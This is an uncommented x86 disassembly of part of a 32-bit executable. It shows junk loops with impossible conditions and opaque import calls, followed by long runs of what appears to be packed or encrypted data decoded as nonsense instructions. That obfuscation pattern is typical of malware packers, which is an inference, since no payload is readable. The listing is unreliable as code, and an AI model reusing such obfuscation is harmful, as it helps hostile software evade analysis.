  40f459:	and    DWORD PTR ds:0x42a809,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a809
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a809,edx
  40f477:	cmp    DWORD PTR ds:0x42a809,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a809,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7c9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7c9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7c9,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7c9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7c9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a841,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a841
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a841,edi
  40f528:	cmp    DWORD PTR ds:0x42a841,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a841,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7cd
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a831,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	shr    DWORD PTR [edi-0x44e7d337],0x42
  40f577:	js     0x40f5f1
  40f579:	in     eax,0x7e
  40f57b:	js     0x40f5f5
  40f57d:	push   eax
  40f57f:	push   edi
  40f580:	pop    ebp
  40f581:	call   0xe43d:0xbeabd89e
  40f588:	inc    ebp
  40f589:	cs (bad) 
  40f58b:	push   eax
  40f58c:	push   0x73
  40f58e:	and    al,0xbc
  40f590:	pop    ebx
  40f591:	ficom  DWORD PTR [edx+0x1b]
  40f594:	repz jl 0x40f5c4
  40f597:	adc    ecx,DWORD PTR [ecx+esi*4]
  40f59a:	inc    edx
  40f59b:	adc    edx,DWORD PTR [edx]
  40f59d:	inc    ebp
  40f59e:	jge    0x40f5f2
  40f5a0:	int    0x9d
  40f5a2:	lahf   
  40f5a3:	ret    
  40f5a4:	fsub   QWORD PTR [ebx]
  40f5a6:	dec    esp
  40f5a7:	call   0x2b2c:0xdc5b8c65
  40f5ae:	push   edx
  40f5af:	dec    esp
  40f5b0:	outs   dx,BYTE PTR ds:[esi]
  40f5b1:	xor    BYTE PTR [ecx],al
  40f5b3:	inc    esi
  40f5b4:	loopne 0x40f5c6
  40f5b6:	push   0xffffffc7
  40f5b8:	inc    esp
  40f5b9:	cwde   
  40f5ba:	cmp    bh,BYTE PTR [ebp+0x1a]
  40f5bd:	fadd   QWORD PTR [ebp-0x1644ad5e]
  40f5c3:	jp     0x40f5e4
  40f5c5:	ficom  WORD PTR [edi-0x80]
  40f5c8:	adc    dl,BYTE PTR [edi+edi*1+0x4f]
  40f5cc:	add    edx,DWORD PTR [ecx-0x33071c76]
  40f5d2:	outs   dx,DWORD PTR ds:[esi]
  40f5d3:	pop    ebx
  40f5d4:	jae    0x40f606
  40f5d6:	dec    ecx
  40f5d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5d8:	adc    BYTE PTR [esi-0x4663b708],0x72
  40f5df:	ret    
  40f5e0:	xchg   esi,eax
  40f5e1:	bound  eax,QWORD PTR [esi+0x26]
  40f5e4:	sbb    cl,BYTE PTR [eax-0x78]
  40f5e7:	int3   
  40f5e8:	adc    ebx,0x34
  40f5eb:	xchg   ebp,eax
  40f5ec:	idiv   ecx
  40f5ee:	adc    ah,BYTE PTR [ebx+0x43]
  40f5f1:	add    eax,0x6cc120c1
  40f5f6:	sbb    DWORD PTR [ebx],0x4b0731ac
  40f5fc:	push   ecx
  40f5fd:	in     eax,dx
  40f5fe:	cmp    dh,bl
  40f600:	aam    0xe4
  40f602:	sbb    ch,ah
  40f604:	pop    ds
  40f605:	or     ch,BYTE PTR [eax-0x690bb8e1]
  40f60b:	popa   
  40f60c:	scas   eax,DWORD PTR es:[edi]
  40f60d:	fwait
  40f60e:	mov    esp,0x67e9a548
  40f613:	aam    0x15
  40f615:	lahf   
  40f616:	cmp    ecx,DWORD PTR [eax+0x5e5473c7]
  40f61c:	ss mov ah,0x3
  40f61f:	sti    
  40f620:	fs push ebx
  40f622:	icebp  
  40f623:	or     BYTE PTR [ebp+0x66141c58],0x62
  40f62a:	das    
  40f62b:	or     BYTE PTR [edx*8-0x2e12ea8f],bl
  40f632:	add    al,BYTE PTR ds:0x7ae88bf8
  40f638:	xlat   BYTE PTR ds:[ebx]
  40f639:	mov    ebp,0x763b1224
  40f63e:	or     ah,bl
  40f640:	push   ss
  40f641:	hlt    
  40f642:	stos   DWORD PTR es:[edi],eax
  40f643:	lahf   
  40f644:	ret    0xe115
  40f647:	xchg   ecx,ebx
  40f649:	fnstenv [edx]
  40f64b:	sbb    bh,BYTE PTR [edi-0x4c]
  40f64e:	fdiv   DWORD PTR [ebp+0x2b717e21]
  40f654:	xchg   ebx,eax
  40f655:	xor    esp,DWORD PTR [ecx+edx*1]
  40f658:	aad    0x35
  40f65a:	cmp    esp,edx
  40f65c:	mov    edi,DWORD PTR [ebx]
  40f65e:	rcr    DWORD PTR [eax+ebx*2+0x1d],1
  40f662:	call   0x180b2621
  40f667:	js     0x40f6de
  40f669:	mov    BYTE PTR ds:0x4c2d6486,al
  40f66f:	jno    0x40f6d0
  40f671:	push   edi
  40f672:	push   ebx
  40f673:	jmp    0x40f660
  40f675:	push   0x9f450231
  40f67a:	nop
  40f67b:	push   0xffffffe6
  40f67d:	push   ebp
  40f67e:	jge    0x40f6e1
  40f680:	retf   
  40f681:	stos   DWORD PTR es:[edi],eax
  40f682:	cbw    
  40f684:	fsub   st,st(6)
  40f686:	mov    WORD PTR [eax],ds
  40f688:	repz daa 
  40f68a:	repz sub BYTE PTR [esi+0x705f2b0],dl
  40f691:	sub    ch,al
  40f693:	xchg   DWORD PTR [ebx],ebp
  40f695:	push   ebp
  40f696:	mov    DWORD PTR [ebp-0xf7832de],ebx
  40f69c:	push   edx
  40f69d:	cmp    al,0x72
  40f69f:	shl    DWORD PTR [edx],cl
  40f6a1:	sbb    ah,al
  40f6a3:	pusha  
  40f6a4:	xchg   ebx,eax
  40f6a5:	mov    al,ds:0xd9b4097e
  40f6aa:	pop    edi
  40f6ab:	and    al,0x85
  40f6ad:	in     eax,dx
  40f6ae:	inc    esp
  40f6af:	fs nop
  40f6b1:	int3   
  40f6b2:	mov    eax,ds:0xd042f0a2
  40f6b7:	popa   
  40f6b8:	sub    DWORD PTR [ecx],esi
  40f6ba:	rcr    BYTE PTR [ebx+0x6401982],1
  40f6c0:	ret    0x8f20
  40f6c3:	xor    eax,0xea45e18e
  40f6c8:	push   ebp
  40f6c9:	mov    dl,0x9b
  40f6cb:	xchg   edi,eax
  40f6cc:	pop    edi
  40f6cd:	sbb    al,0xc5
  40f6cf:	jbe    0x40f740
  40f6d1:	jnp    0x40f748
  40f6d3:	add    eax,DWORD PTR [ebx+0x5]
  40f6d6:	test   al,0x88
  40f6d8:	xor    BYTE PTR [ecx-0x6ed3bd6f],dh
  40f6de:	and    al,0x5d
  40f6e0:	sar    DWORD PTR [ecx-0x17a42692],1
  40f6e6:	sti    
  40f6e7:	jl     0x40f676
  40f6e9:	outs   dx,BYTE PTR ds:[esi]
  40f6ea:	pop    esp
  40f6eb:	jno    0x40f70d
  40f6ed:	retf   0x2f74
  40f6f0:	fdiv   st(1),st
  40f6f2:	jne    0x40f753
  40f6f4:	jmp    0xa7b6a67a
  40f6f9:	add    DWORD PTR [edi+0x3b],0xc35c92db
  40f700:	mov    ds:0xdd4f7440,al
  40f705:	jecxz  0x40f6c8
  40f707:	nop
  40f708:	rep ins BYTE PTR es:[edi],dx
  40f70a:	xchg   BYTE PTR [edi-0x34adea71],dl
  40f710:	mov    dl,0x60
  40f712:	int    0x27
  40f714:	rcl    DWORD PTR [esi],cl
  40f716:	xchg   ebx,eax
  40f717:	int    0x1
  40f719:	std    
  40f71a:	sbb    ecx,DWORD PTR [edi-0x33]
  40f71d:	hlt    
  40f71e:	inc    ecx
  40f71f:	in     eax,0xfc
  40f721:	aas    
  40f722:	stc    
  40f723:	push   ebp
  40f724:	inc    edi
  40f725:	inc    eax
  40f726:	repnz xchg ebx,eax
  40f728:	mov    DWORD PTR [ecx-0x2f6bb3a4],edx
  40f72e:	add    al,BYTE PTR [edi-0x5f29f0e4]
  40f734:	mov    ah,0x16
  40f736:	mov    BYTE PTR [esi+0xed51450],al
  40f73c:	mov    eax,0x5a753376
  40f741:	cmp    DWORD PTR [eax],esp
  40f743:	(bad)  
  40f744:	leave  
  40f745:	adc    al,0xe0
  40f747:	push   0x1c
  40f749:	adc    bh,BYTE PTR [esi+0x59]
  40f74c:	inc    ecx
  40f74d:	repnz xor BYTE PTR [ecx],dl
  40f750:	cmp    DWORD PTR ds:0xc0afbd33,ebx
  40f756:	pop    ds
  40f757:	mov    ecx,0xdbc2c742
  40f75c:	test   al,0xc6
  40f75e:	xchg   esp,eax
  40f75f:	pop    edx
  40f760:	mov    eax,ds:0xb7aafaf3
  40f765:	ret    0xf04f
  40f768:	sub    al,0x6d
  40f76a:	cs sbb eax,0xf3684f75
  40f770:	pop    esi
  40f771:	push   0x9e120555
  40f776:	or     DWORD PTR [esi-0x7],ebx
  40f779:	push   esi
  40f77a:	nop
  40f77b:	repnz test BYTE PTR [edi],ah
  40f77e:	(bad)  
  40f780:	mov    cl,0xba
  40f782:	ins    BYTE PTR es:[edi],dx
  40f783:	inc    edx
  40f784:	out    dx,eax
  40f785:	push   ebx
  40f786:	bnd jb 0x40f775
  40f789:	add    BYTE PTR ds:[eax+0x2c],cl
  40f78d:	rol    esp,0x9e
  40f790:	cmp    ecx,ebp
  40f792:	popa   
  40f793:	cmp    DWORD PTR [edi+0x11],edi
  40f796:	aad    0x8b
  40f798:	mov    cl,0x81
  40f79a:	es dec esi
  40f79c:	xlat   BYTE PTR ds:[ebx]
  40f79d:	jo     0x40f815
  40f79f:	and    BYTE PTR [eax-0x39],ch
  40f7a2:	loopne 0x40f7dd
  40f7a4:	mov    dl,0xdb
  40f7a6:	sub    bl,al
  40f7a8:	bound  ecx,QWORD PTR [esi-0x12]
  40f7ab:	mov    bl,BYTE PTR [edx]
  40f7ad:	pop    ebx
  40f7ae:	xor    eax,0x1bea1913
  40f7b3:	cli    
  40f7b4:	popa   
  40f7b5:	or     ebp,DWORD PTR [esi+ebx*4-0x77]
  40f7b9:	outs   dx,DWORD PTR ds:[esi]
  40f7ba:	fucomip st,st(6)
  40f7bc:	xor    bh,BYTE PTR [ecx+edx*2+0x2f4ae600]
  40f7c3:	inc    edi
  40f7c4:	jge    0x40f7d3
  40f7c6:	add    BYTE PTR [esp+eax*8+0x2d],0x56
  40f7cb:	test   BYTE PTR [edi-0x20e960a7],dh
  40f7d1:	ins    BYTE PTR es:[edi],dx
  40f7d2:	jnp    0x40f7a4
  40f7d4:	test   DWORD PTR [ebp-0x80],esi
  40f7d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7d8:	pop    es
  40f7d9:	ins    BYTE PTR es:[edi],dx
  40f7da:	inc    edx
  40f7db:	add    eax,0x596355c3
  40f7e0:	jmp    0x40f767
  40f7e2:	repnz xchg bl,dl
  40f7e5:	leave  
  40f7e6:	or     BYTE PTR [ebp+0x3],0xd1
  40f7ea:	cmp    edi,edx
  40f7ec:	mov    DWORD PTR ds:0x42a779,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0x167e945f,ch
  40f80a:	data16 and BYTE PTR [edi+0x78],al
  40f80e:	js     0x40f7f5
  40f810:	jle    0x40f88a
  40f812:	js     0x40f7b6
  40f814:	inc    ecx
  40f815:	sub    al,0x6
  40f817:	cmp    ebx,DWORD PTR [ecx-0x25]
  40f81a:	add    DWORD PTR [esi-0x3f354af9],ebx
  40f820:	std    
  40f821:	adc    BYTE PTR [esi+0x7b],0xbc
  40f825:	pop    esp
  40f826:	push   eax
  40f827:	inc    edi
  40f828:	out    0x74,al
  40f82a:	lods   eax,DWORD PTR ds:[esi]
  40f82b:	lods   eax,DWORD PTR ds:[esi]
  40f82c:	pop    esi
  40f82d:	test   al,0x21
  40f82f:	int3   
  40f830:	sbb    ch,BYTE PTR [edi+0x988d8b6]
  40f836:	mov    al,ds:0x59ef624c
  40f83b:	inc    edi
  40f83c:	mov    DWORD PTR [esi-0x41],eax
  40f83f:	outs   dx,WORD PTR ds:[esi]
  40f841:	mov    cl,0xeb
  40f843:	(bad)  [edx-0x212089d4]
  40f849:	leave  
  40f84a:	dec    ebx
  40f84b:	dec    edi
  40f84c:	pop    DWORD PTR [ecx+0x7c006882]
  40f852:	std    
  40f853:	jae    0x40f803
  40f855:	bound  edx,QWORD PTR [ebp+0x62]
  40f858:	inc    ebp
  40f859:	ins    BYTE PTR es:[edi],dx
  40f85a:	jne    0x40f8cf
  40f85c:	and    al,0x4a
  40f85e:	mov    eax,0x64c43267
  40f863:	mov    dh,0x86
  40f865:	fild   DWORD PTR [edx+0x1dc98bc4]
  40f86b:	pop    eax
  40f86c:	inc    esi
  40f86d:	fmul   st(6),st
  40f86f:	ret    0xea36
  40f872:	js     0x40f8f0
  40f874:	popaw  
  40f876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f877:	in     al,0xb4
  40f879:	cs stc 
  40f87b:	repnz add DWORD PTR [eax+0x48],esp
  40f87f:	repnz in eax,dx
  40f881:	mov    al,0x4e
  40f883:	sbb    al,bh
  40f885:	rcr    BYTE PTR [ebp+0x55368501],0x75
  40f88c:	inc    esp
  40f88d:	push   DWORD PTR [ebx-0x31cfe023]
  40f893:	stos   DWORD PTR es:[edi],eax
  40f894:	jbe    0x40f8e9
  40f896:	and    DWORD PTR [ebx+0x412a576],ebp
  40f89c:	dec    esi
  40f89d:	(bad)  
  40f89e:	cmp    al,0x2
  40f8a0:	pushf  
  40f8a1:	arpl   WORD PTR [ebx-0x24],sp
  40f8a4:	mov    bl,0x2
  40f8a6:	xchg   ecx,eax
  40f8a7:	lods   al,BYTE PTR ds:[esi]
  40f8a8:	int    0xd5
  40f8aa:	sbb    esp,edi
  40f8ac:	fdivr  QWORD PTR [ebx+ebp*1]
  40f8af:	out    0x6d,eax
  40f8b1:	jmp    0x1965:0x26a263e2
  40f8b8:	stc    
  40f8b9:	btc    DWORD PTR [edx],esp
  40f8bc:	mov    ds,WORD PTR [esi+0x7628e4cb]
  40f8c2:	xlat   BYTE PTR ds:[ebx]
  40f8c3:	xor    bl,bh
  40f8c5:	cli    
  40f8c6:	das    
  40f8c7:	jmp    0x40f87c
  40f8c9:	leave  
  40f8ca:	mov    al,0xda
  40f8cc:	jb     0x40f92d
  40f8ce:	rcl    ch,0x73
  40f8d1:	cmp    dl,BYTE PTR [ebp-0x1ee9d8f0]
  40f8d7:	je     0x40f8ff
  40f8d9:	pop    ecx
  40f8da:	mov    edx,DWORD PTR [ebx+0x35]
  40f8dd:	test   BYTE PTR [ebx+edi*2],ch
  40f8e0:	cld    
  40f8e1:	outs   dx,DWORD PTR ds:[esi]
  40f8e2:	push   eax
  40f8e3:	dec    ecx
  40f8e4:	dec    ebp
  40f8e5:	cmp    BYTE PTR [edi],0x73
  40f8e8:	inc    edx
  40f8e9:	mov    esi,0x9f9dbc1c
  40f8ee:	push   0x5
  40f8f0:	sbb    al,bl
  40f8f2:	xchg   DWORD PTR [ecx],ebp
  40f8f4:	pushf  
  40f8f5:	imul   ecx,DWORD PTR [esp+ebp*1+0x4b4e69a6],0xfffffffd
  40f8fd:	xor    ah,BYTE PTR [ebp-0x1ad17134]
  40f903:	(bad)  
  40f904:	push   cs
  40f905:	(bad)  
  40f906:	(bad)  
  40f907:	out    dx,al
  40f908:	ret    
  40f909:	hlt    
  40f90a:	xchg   bh,ch
  40f90c:	jmp    0x40f90b
  40f90e:	and    eax,0x708960a8
  40f913:	adc    edi,DWORD PTR [eax+0x6a]
  40f916:	add    cl,BYTE PTR [edi+0x1069a26b]
  40f91c:	pop    esi
  40f91d:	sbb    edi,esp
  40f91f:	jae    0x40f8e1
  40f921:	pop    ss
  40f922:	xchg   BYTE PTR [ebx*8-0x7a59500b],ah
  40f929:	add    dl,BYTE PTR [esi+edx*1+0x583d4e99]
  40f930:	imul   ecx,DWORD PTR [ecx-0xe26b248],0x1b
  40f937:	call   0xb3a9:0x8f24d624
  40f93e:	fcom   QWORD PTR [ebx-0x3c]
  40f941:	inc    ebx
  40f942:	call   DWORD PTR [esi+0x6aa6bbce]
  40f948:	pop    esi
  40f949:	lds    eax,FWORD PTR [esi]
  40f94b:	push   eax
  40f94c:	xchg   ebx,eax
  40f94d:	mov    al,0x6e
  40f94f:	sub    edi,ecx
  40f951:	out    dx,al
  40f952:	sar    DWORD PTR [eax],1
  40f954:	pop    edx
  40f955:	fistp  DWORD PTR [edx-0x53]
  40f958:	fisubr WORD PTR [edi-0x4a]
  40f95b:	xor    eax,0x765efd7e
  40f960:	pop    esp
  40f961:	jnp    0x40f904
  40f963:	xor    eax,0x353a49e1
  40f968:	out    dx,al
  40f969:	ret    
  40f96a:	fscale 
  40f96c:	pop    ecx
  40f96d:	into   
  40f96e:	push   edx
  40f96f:	mov    bh,bl
  40f971:	mov    es,WORD PTR [edi-0x1d]
  40f974:	or     esi,0xffffffc2
  40f977:	mov    eax,0x660a3250
  40f97c:	mov    bl,0x82
  40f97e:	repz sahf 
  40f980:	loopne 0x40f908
  40f982:	add    ch,ch
  40f984:	push   edx
  40f985:	fnsave [ebp+0x26143d20]
  40f98b:	js     0x40f9f3
  40f98d:	outs   dx,DWORD PTR ds:[esi]
  40f98e:	shl    ecx,1
  40f990:	aas    
  40f991:	jmp    0x40f917
  40f993:	data16 add dl,BYTE PTR [edi-0x30]
  40f997:	je     0x40f97b
  40f999:	add    ebp,DWORD PTR [ebp+0x37e098e8]
  40f99f:	xchg   esi,eax
  40f9a0:	popa   
  40f9a1:	xor    al,0x54
  40f9a3:	cli    
  40f9a4:	stos   BYTE PTR es:[edi],al
  40f9a5:	fbld   TBYTE PTR [edi*4+0x5cdf504f]
  40f9ac:	jns    0x40f9a2
  40f9ae:	push   edx
  40f9af:	(bad)  
  40f9b0:	clc    
  40f9b1:	pop    ecx
  40f9b2:	mov    BYTE PTR [eax-0x1c66a23d],dh
  40f9b8:	(bad)  
  40f9b9:	in     al,0xdd
  40f9bb:	push   edx
  40f9bc:	jmp    0x40f9c7
  40f9be:	pusha  
  40f9bf:	push   esp
  40f9c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9c2:	sbb    BYTE PTR [eax+edx*1+0x1c677ca9],ch
  40f9c9:	dec    ebx
  40f9ca:	jl     0x40f9cc
  40f9cc:	dec    edi
  40f9cd:	jno    0x40f95a
  40f9cf:	sub    DWORD PTR [ecx+esi*2-0x1e974859],edi
  40f9d6:	icebp  
  40f9d7:	push   esp
  40f9d8:	adc    al,bl
  40f9da:	int3   
  40f9db:	(bad)  
  40f9dc:	or     al,0xc3
  40f9de:	outs   dx,BYTE PTR ds:[esi]
  40f9df:	mov    edi,0xd6c11ba7
  40f9e4:	push   ds
  40f9e5:	mov    al,ds:0xd29d3f14
  40f9ea:	lds    edx,FWORD PTR [esi-0x10]
  40f9ed:	popf   
  40f9ee:	mov    DWORD PTR [ecx-0x72],eax
  40f9f1:	pop    ebp
  40f9f2:	mov    bh,0xf3
  40f9f4:	in     eax,0xfd
  40f9f6:	pop    es
  40f9f7:	push   edx
  40f9f8:	sbb    BYTE PTR [edx-0x47262055],ah
  40f9fe:	aaa    
  40f9ff:	mov    edx,0xfb358085
  40fa04:	cwde   
  40fa05:	jg     0x40fa13
  40fa07:	jbe    0x40fa2f
  40fa09:	int    0x13
  40fa0b:	xchg   esp,eax
  40fa0c:	out    dx,eax
  40fa0d:	(bad)  
  40fa0e:	out    dx,al
  40fa0f:	pop    ebp
  40fa10:	pop    edi
  40fa11:	(bad)  
  40fa12:	jo     0x40fa7e
  40fa14:	sbb    al,0x2e
  40fa16:	sub    eax,0xd002ef7e
  40fa1b:	pop    ebx
  40fa1c:	mov    al,ds:0x501b9825
  40fa21:	fstp   TBYTE PTR es:[eax+0x4f]
  40fa25:	mov    eax,ds:0x2bbad476
  40fa2a:	daa    
  40fa2b:	and    esi,0x5efddb74
  40fa31:	mov    ah,0x20
  40fa33:	or     BYTE PTR [edx],al
  40fa35:	dec    edi
  40fa36:	push   eax
  40fa37:	fsqrt  
  40fa39:	adc    eax,0xbf01daa3
  40fa3e:	mov    ebx,0x461114d
  40fa43:	ss dec ebx
  40fa45:	mov    BYTE PTR [eax-0x4a],dh
  40fa48:	jo     0x40f9d7
  40fa4a:	icebp  
  40fa4b:	or     al,BYTE PTR [eax]
  40fa4d:	retf   
  40fa4e:	and    eax,0x3aa0631e
  40fa53:	adc    al,BYTE PTR ds:0xe03b2cfb
  40fa59:	push   ecx
  40fa5a:	dec    ecx
  40fa5b:	(bad)  
  40fa5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa5d:	outs   dx,DWORD PTR ds:[esi]
  40fa5e:	xchg   esi,eax
  40fa5f:	inc    ecx
  40fa60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa61:	pop    DWORD PTR [bx-0xd6d]
  40fa66:	dec    ebx
  40fa67:	push   eax
  40fa68:	shl    DWORD PTR [ebx],1
  40fa6a:	sbb    BYTE PTR [eax],0x8e
  40fa6d:	pusha  
  40fa6e:	pop    ecx
  40fa6f:	test   al,0xed
  40fa71:	mov    dl,0x5a
  40fa73:	rol    cl,cl
  40fa75:	push   0x5c4eecb1
  40fa7a:	cdq    
  40fa7b:	xchg   esi,eax
  40fa7c:	inc    ebp
  40fa7d:	xor    BYTE PTR [edi],cl
  40fa7f:	test   BYTE PTR [ebx+0x53000053],ch
  40fa85:	mov    DWORD PTR ds:0x42a809,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7c1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7c1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7c1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7c1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7c1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7c1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7c1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7c1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fb16
  40fb0f:	jae    0x40fb5b
  40fb11:	push   eax
  40fb12:	lea    eax,[ebp+0x78]
  40fb15:	js     0x40fafc
  40fb17:	jle    0x40fb91
  40fb19:	js     0x40fb41
  40fb1b:	aas    
  40fb1c:	into   
  40fb1d:	call   0x5926:0xbeee70b5
  40fb24:	sub    BYTE PTR [ebp-0x79b731d5],bh
  40fb2a:	push   esp
  40fb2b:	ja     0x40fb53
  40fb2d:	popa   
  40fb2e:	adc    eax,0x3df0ca51
  40fb33:	lods   eax,DWORD PTR ds:[esi]
  40fb34:	(bad)  
  40fb36:	mov    al,ds:0x5673d8f6
  40fb3b:	or     al,0xdd
  40fb3d:	mov    bh,BYTE PTR [ecx]
  40fb3f:	into   
  40fb40:	add    al,0x2b
  40fb42:	shl    DWORD PTR [esi],cl
  40fb44:	inc    ebx
  40fb45:	or     DWORD PTR [edi-0x7247c357],edi
  40fb4b:	nop
  40fb4c:	loop   0x40fb59
  40fb4e:	mov    esi,0x70cd423a
  40fb53:	push   esp
  40fb54:	cmp    ah,BYTE PTR [edi]
  40fb56:	shl    ch,1
  40fb58:	adc    ebx,edx
  40fb5a:	adc    al,dh
  40fb5c:	shl    BYTE PTR [esp+edi*2+0x4dbe3af],1
  40fb63:	jae    0x40fb39
  40fb65:	outs   dx,BYTE PTR ds:[esi]
  40fb66:	sub    al,0x76
  40fb68:	jp     0x40faeb
  40fb6a:	xchg   edx,eax
  40fb6b:	jns    0x40fba7
  40fb6d:	pusha  
  40fb6e:	inc    edi
  40fb6f:	out    dx,eax
  40fb70:	xchg   esp,eax
  40fb71:	dec    ebx
  40fb72:	shl    DWORD PTR [ecx-0x29e5bf9f],cl
  40fb78:	and    eax,0xecfcfc60
  40fb7d:	mov    dh,bh
  40fb7f:	or     edx,0x33
  40fb82:	cdq    
  40fb83:	fsub   DWORD PTR [esi]
  40fb85:	and    ch,ch
  40fb87:	bound  ebp,QWORD PTR [edx]
  40fb89:	mov    eax,ds:0x94616a7f
  40fb8e:	outs   dx,BYTE PTR ds:[esi]
  40fb8f:	js     0x40fbee
  40fb91:	push   0x83d3e25c
  40fb96:	ret    0xdab5
  40fb99:	int3   
  40fb9a:	adc    dh,BYTE PTR [edi]
  40fb9c:	retf   0x1f4d
  40fb9f:	repnz fcomp st(5)
  40fba2:	xchg   ebx,eax
  40fba3:	popf   
  40fba4:	sub    ch,BYTE PTR [ebx+0x20336537]
  40fbaa:	push   ebx
  40fbab:	sub    al,0xe
  40fbad:	pop    ebp
  40fbae:	push   edx
  40fbaf:	dec    edi
  40fbb0:	icebp  
  40fbb1:	aas    
  40fbb2:	dec    eax
  40fbb3:	aas    
  40fbb4:	mov    ecx,0x3186bcc
  40fbb9:	xor    eax,0x700d4cb5
  40fbbe:	lock mov ecx,0x9863fb13
  40fbc4:	repz clc 
  40fbc6:	call   FWORD PTR [esi+0x1d26638d]
  40fbcc:	add    esp,DWORD PTR [eax-0x419ddf77]
  40fbd2:	mul    BYTE PTR [edi+edi*4]
  40fbd5:	fidiv  DWORD PTR [edi-0x58]
  40fbd8:	and    al,0xd9
  40fbda:	adc    al,0xbb
  40fbdc:	push   esp
  40fbdd:	outs   dx,BYTE PTR ds:[esi]
  40fbde:	adc    DWORD PTR [eax+0x643dd34a],edx
  40fbe4:	cmp    BYTE PTR [edx],bl
  40fbe6:	pop    es
  40fbe7:	imul   BYTE PTR [edi+0x7c2e9a23]
  40fbed:	xchg   esi,eax
  40fbee:	mov    bh,0x73
  40fbf0:	inc    ebx
  40fbf1:	sub    edi,DWORD PTR [ecx+0x6a]
  40fbf4:	fiadd  WORD PTR [ecx+eax*1-0x14f27d3a]
  40fbfb:	adc    dl,cl
  40fbfd:	jg     0x40fb89
  40fbff:	sub    esi,DWORD PTR [edi]
  40fc01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc02:	or     al,0x42
  40fc04:	or     BYTE PTR [edi+edi*8+0x2f],dh
  40fc08:	add    ch,ch
  40fc0a:	fwait
  40fc0b:	mov    ebx,0x66a05c58
  40fc10:	ja     0x40fc06
  40fc12:	mov    ebp,0x1e9d9920
  40fc17:	mov    ds:0x72278be,al
  40fc1c:	aad    0xdb
  40fc1e:	mov    ds:0xae5ade71,al
  40fc23:	repz adc BYTE PTR [ebx-0x43],dh
  40fc27:	ja     0x40fc40
  40fc29:	pop    esp
  40fc2a:	(bad)  
  40fc2b:	dec    ecx
  40fc2c:	mov    es:0x32beec1f,al
  40fc32:	mov    al,ds:0xb653c1ce
  40fc37:	sbb    eax,0x6dd280f1
  40fc3c:	push   ebx
  40fc3d:	inc    ebx
  40fc3e:	ret    0x8aea
  40fc41:	popf   
  40fc42:	aas    
  40fc43:	or     eax,0x63f239e9
  40fc48:	mov    edx,0x5796e724
  40fc4d:	push   edx
  40fc4e:	and    ebp,DWORD PTR [edi+0x26939e17]
  40fc54:	outs   dx,DWORD PTR ds:[esi]
  40fc55:	add    DWORD PTR [ecx-0x4d],esi
  40fc58:	sub    DWORD PTR [eax-0x1f50a1b6],0x38a821b
  40fc62:	xchg   edx,eax
  40fc63:	aas    
